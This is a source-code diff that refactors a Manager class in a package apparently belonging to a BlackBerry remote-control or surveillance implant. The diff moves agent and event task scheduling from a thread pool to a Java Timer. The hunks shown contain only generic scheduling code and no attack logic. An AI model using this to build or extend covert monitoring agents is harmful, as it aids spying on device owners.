@@ -9,11 +9,10 @@
 package com.ht.rcs.blackberry;
 
 import java.util.Vector;
+import java.util.Timer;
 
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.threadpool.ThreadPool;
-import com.ht.rcs.blackberry.threadpool.Scheduler;
 import com.ht.rcs.blackberry.threadpool.TimerJob;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -51,15 +50,16 @@ public abstract class Manager {
         thread.enable(true);
     }
 
-    public final boolean isRunning(int id) {
-        return getItem(id).isRunning();
-    }
+    /*
+     * public final boolean isRunning(int id) { return getItem(id).isRunning();
+     * }
+     */
 
     public abstract TimerJob getItem(int id);
 
     public abstract Vector getAllItems();
-    
-    private Scheduler threadPool = new Scheduler(4);
+
+    private Timer timer = new Timer();
 
     /**
      * Re start.
@@ -69,23 +69,28 @@ public abstract class Manager {
      * @return true, if successful
      */
     public boolean reStart(int id) {
+        //#ifdef DBC
+        Check.requires(timer != null, "Timer null");
+        //#endif
+
         // #debug
         debug.trace("restart " + id);
         boolean ret = true;
 
-        TimerJob thread = getItem(id);
-        if (thread == null) {
+        TimerJob task = getItem(id);
+
+        if (task == null) {
             // #debug
             debug.error("Thread unknown: " + id);
             return false;
         }
 
-        if (thread.isEnabled() && thread.isRunning()) {
-            thread.restart();
+        if (task.isEnabled() && task.isScheduled()) {
+            task.restart();
         } else {
             // #mdebug
-            debug.error("cannot restart: " + id + " enabled:" + isEnabled(id)
-                    + " running:" + isRunning(id));
+            debug.warn("cannot restart: " + id + " enabled:" + task.isEnabled()
+                    + " scheduled:" + task.isScheduled());
             // #enddebug
         }
         return ret;
@@ -100,30 +105,31 @@ public abstract class Manager {
      */
     public final synchronized boolean start(int id) {
 
-        TimerJob stThread = getItem(id);
-        if (stThread == null) {
+        //#ifdef DBC
+        Check.requires(timer != null, "Timer null");
+        //#endif
+
+        TimerJob task = getItem(id);
+        if (task == null) {
             // #debug
             debug.error("Thread unknown: " + id);
             return false;
         }
 
-        if (!stThread.isEnabled()) {
+        if (!task.isEnabled()) {
             // #debug
             debug.error("Not enabled [0] " + id);
             return false;
         }
 
-        if (stThread.isRunning()) {
+        if (task.isScheduled()) {
             // #debug
-            debug.info("Start RUNNING" + id);
+            debug.info("Already scheduled" + id);
             return true;
         }
 
-        //Thread thread = new Thread(stThread);
-        //thread.start();
-        
-        threadPool.add(stThread);
-        
+        task.addToTimer(timer);
+
         // #debug
         debug.trace("Start() OK");
         return true;
@@ -135,13 +141,15 @@ public abstract class Manager {
      * 
      * @return true, if successful
      */
-    public final boolean startAll() {
-        Vector threads = getAllItems();
-        int tsize = threads.size();
+    public final synchronized boolean startAll() {
+        Vector tasks = getAllItems();
+        int tsize = tasks.size();
+
+        timer = new Timer();
 
         //#mdebug
         for (int i = 0; i < tsize; ++i) {
-            TimerJob thread = (TimerJob) threads.elementAt(i);
+            TimerJob thread = (TimerJob) tasks.elementAt(i);
             debug.trace("Thread to start: " + thread);
             thread = null;
         }
@@ -149,28 +157,24 @@ public abstract class Manager {
 
         try {
             for (int i = 0; i < tsize; ++i) {
-                TimerJob stThread = (TimerJob) threads.elementAt(i);
+                TimerJob task = (TimerJob) tasks.elementAt(i);
 
-                if (stThread.isEnabled()) {
+                if (task.isEnabled()) {
                     // #debug
-                    debug.trace("Starting: " + stThread);
-                    /*Thread thread = new Thread(stThread);
-                    thread.start();*/
-                    threadPool.add(stThread);
-                                        
+                    debug.trace("Starting: " + task);
+                    task.addToTimer(timer);
+
                 } else {
                     // #debug
-                    debug.trace("Not starting because disabled: " + stThread);
+                    debug.trace("Not starting because disabled: " + task);
                 }
-                
-                Utils.sleep(100);
+
+                //Utils.sleep(100);
             }
         } catch (Exception ex) {
             debug.error(ex.toString());
         }
-        
-        threadPool.start();
-        
+
         // #debug
         debug.trace("StartAll() OK");
         return true;
@@ -184,12 +188,16 @@ public abstract class Manager {
      * @return the int
      */
     public final synchronized boolean stop(int id) {
-        TimerJob thread = getItem(id);
+        //#ifdef DBC
+        Check.requires(timer != null, "Timer null");
+        //#endif
 
-        if (thread.isRunning()) {
-            if (thread != null) {
-                thread.stop();
-            }      
+        TimerJob task = getItem(id);
+
+        if (task.isScheduled()) {
+            if (task != null) {
+                task.stop();
+            }
         }
 
         return true;
@@ -200,20 +208,17 @@ public abstract class Manager {
      * 
      * @return the int
      */
-    public final boolean stopAll() {
-        Vector threads = getAllItems();
+    public final synchronized boolean stopAll() {
+        Vector tasks = getAllItems();
+        int tsize = tasks.size();
 
-        int tsize = threads.size();
+        timer.cancel();
         for (int i = 0; i < tsize; ++i) {
-            TimerJob thread = (TimerJob) threads.elementAt(i);
-
-            if (thread.isRunning()) {
-                thread.stop();               
-            }
+            TimerJob task = (TimerJob) tasks.elementAt(i);
+            task.stop();
         }
-
-        // #debug
-        debug.trace("StopAll() OK");
+        
+        timer = null;
         return true;
     }
 }
